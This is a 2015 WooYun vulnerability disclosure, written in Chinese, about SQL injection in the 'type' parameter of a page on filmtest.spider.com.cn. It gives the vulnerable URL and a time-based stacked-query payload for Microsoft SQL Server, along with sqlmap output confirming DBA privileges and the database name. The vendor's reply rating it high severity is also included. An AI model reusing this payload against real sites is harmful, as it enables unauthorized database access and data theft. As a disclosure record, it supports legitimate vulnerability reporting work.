wybug_title: 蜘蛛网某站存在sql注入漏洞(dba权限)
wybug_detail:
漏洞详情 披露状态：   									2015-11-21：	细节已通知厂商并且等待厂商处理中									2015-11-26：	厂商已经确认，细节仅向厂商公开									2015-12-06：	细节向核心白帽子及相关领域专家公开									2015-12-16：	细节向普通白帽子公开									2015-12-26：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述：  详细说明：  
http://filmtest.spider.com.cn/tickdating.html?order=hotdating&type=zfLIo4
type
sqlmap resumed the following injection point(s) from stored session:---Parameter: type (GET)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: order=hotdating&type=zfLIo4';WAITFOR DELAY '0:0:5'-----[06:27:49] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2012
虽然只是一枚盲注，但是是dba权限
sqlmap resumed the following injection point(s) from stored session:---Parameter: type (GET)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: order=hotdating&type=zfLIo4';WAITFOR DELAY '0:0:5'-----[06:27:12] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2012[06:27:12] [INFO] testing if current user is DBAdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] ycurrent user is DBA:    True
跑一半没数据了。。。   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: type (GET)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: order=hotdating&type=zfLIo4';WAITFOR DELAY '0:0:5'-----[06:59:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2012[06:59:16] [INFO] fetching current database[06:59:16] [INFO] resumed: spider_filmcurrent database:    'spider_film'
换一枚邀请码吧。。   修复方案：  你懂的   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-26 08:52 厂商回复： 检查中 最新状态： 暂无
